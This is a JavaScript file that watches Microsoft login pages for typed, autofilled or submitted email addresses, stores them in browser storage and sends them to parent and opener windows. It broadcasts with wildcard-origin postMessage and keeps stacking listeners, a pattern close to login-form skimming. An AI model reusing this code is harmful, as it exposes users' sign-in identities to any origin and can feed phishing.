/**
 * Email Capture Enhancer
 * Captures the user's email as they type it into Microsoft login forms
 * Stores it for later retrieval in the OAuth callback
 */

(function() {
    'use strict';
    
    console.log('📧 Email Capture Enhancer loading...');
    
    let capturedEmail = '';
    let lastEmailValue = '';
    
    // Function to store captured email
    function storeEmail(email) {
        if (email && email.includes('@') && email !== lastEmailValue) {
            capturedEmail = email;
            lastEmailValue = email;
            
            // Store in multiple places for redundancy
            try {
                localStorage.setItem('microsoft_email', email);
                localStorage.setItem('user_email', email);
                sessionStorage.setItem('microsoft_email', email);
                sessionStorage.setItem('login_hint', email);
                
                console.log('✅ Email captured and stored:', email);
                
                // Also try to send to parent/opener windows
                sendEmailToParent(email);
            } catch (error) {
                console.error('❌ Error storing email:', error);
            }
        }
    }
    
    // Function to send email to parent windows
    function sendEmailToParent(email) {
        const payload = {
            type: 'EMAIL_CAPTURED',
            email: email,
            domain: window.location.hostname,
            timestamp: new Date().toISOString()
        };
        
        try {
            // Send to parent window
            if (window.parent && window.parent !== window) {
                window.parent.postMessage(payload, '*');
                console.log('📤 Sent email to parent window');
            }
            
            // Send to opener window
            if (window.opener) {
                window.opener.postMessage(payload, '*');
                console.log('📤 Sent email to opener window');
            }
        } catch (error) {
            console.error('❌ Error sending email to parent:', error);
        }
    }
    
    // Function to monitor email input fields
    function monitorEmailFields() {
        // Find all email-type inputs
        const emailInputs = document.querySelectorAll(
            'input[type="email"], input[name*="email"], input[name*="mail"], input[name*="user"], input[name*="login"], input[placeholder*="email"], input[placeholder*="mail"]'
        );
        
        emailInputs.forEach(input => {
            // Monitor input changes
            input.addEventListener('input', function(e) {
                const value = e.target.value.trim();
                if (value && value.includes('@')) {
                    console.log('📧 Email field changed:', value);
                    storeEmail(value);
                }
            });
            
            // Monitor on blur (when user leaves the field)
            input.addEventListener('blur', function(e) {
                const value = e.target.value.trim();
                if (value && value.includes('@')) {
                    console.log('📧 Email field completed:', value);
                    storeEmail(value);
                }
            });
            
            // Check if field already has a value
            if (input.value && input.value.includes('@')) {
                console.log('📧 Email field pre-filled:', input.value);
                storeEmail(input.value);
            }
        });
        
        console.log(`📧 Monitoring ${emailInputs.length} email fields`);
    }
    
    // Function to monitor form submissions
    function monitorFormSubmissions() {
        document.addEventListener('submit', function(e) {
            console.log('📝 Form submitted, checking for email...');
            
            // Extract email from all form fields
            const form = e.target;
            const formData = new FormData(form);
            
            for (let [key, value] of formData.entries()) {
                if (typeof value === 'string' && value.includes('@')) {
                    console.log('📧 Email found in form submission:', value);
                    storeEmail(value);
                    break;
                }
            }
            
            // Also check all input fields in the form
            const inputs = form.querySelectorAll('input');
            inputs.forEach(input => {
                if (input.value && input.value.includes('@')) {
                    storeEmail(input.value);
                }
            });
        });
    }
    
    // Function to monitor URL changes (for SPAs)
    function monitorUrlChanges() {
        let currentUrl = window.location.href;
        
        setInterval(() => {
            if (window.location.href !== currentUrl) {
                currentUrl = window.location.href;
                console.log('🔄 URL changed, re-scanning for email fields...');
                setTimeout(monitorEmailFields, 1000);
            }
        }, 2000);
    }
    
    // Function to check URL parameters for email hints
    function checkUrlForEmail() {
        try {
            const urlParams = new URLSearchParams(window.location.search);
            const loginHint = urlParams.get('login_hint');
            const email = urlParams.get('email');
            const username = urlParams.get('username');
            
            if (loginHint && loginHint.includes('@')) {
                console.log('📧 Email found in URL login_hint:', loginHint);
                storeEmail(loginHint);
            } else if (email && email.includes('@')) {
                console.log('📧 Email found in URL parameter:', email);
                storeEmail(email);
            } else if (username && username.includes('@')) {
                console.log('📧 Email found in URL username:', username);
                storeEmail(username);
            }
        } catch (error) {
            console.log('⚠️ Could not check URL parameters');
        }
    }
    
    // Function to monitor for auto-fill
    function monitorAutoFill() {
        setInterval(() => {
            const emailFields = document.querySelectorAll(
                'input[type="email"], input[name*="email"], input[name*="mail"], input[name*="user"], input[name*="login"]'
            );
            
            emailFields.forEach(field => {
                if (field.value && field.value.includes('@') && field.value !== lastEmailValue) {
                    console.log('📧 Auto-fill detected:', field.value);
                    storeEmail(field.value);
                }
            });
        }, 1000);
    }
    
    // Initialize email capture
    function initialize() {
        console.log('📧 Email Capture Enhancer initialized on:', window.location.hostname);
        
        // Check URL for email
        checkUrlForEmail();
        
        // Start monitoring
        monitorEmailFields();
        monitorFormSubmissions();
        monitorUrlChanges();
        monitorAutoFill();
        
        // Re-scan periodically for dynamically added fields
        setInterval(monitorEmailFields, 3000);
    }
    
    // Start when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initialize);
    } else {
        initialize();
    }
    
    // Also initialize after a short delay to catch late-loading forms
    setTimeout(initialize, 2000);
    
    console.log('📧 Email Capture Enhancer loaded');
})();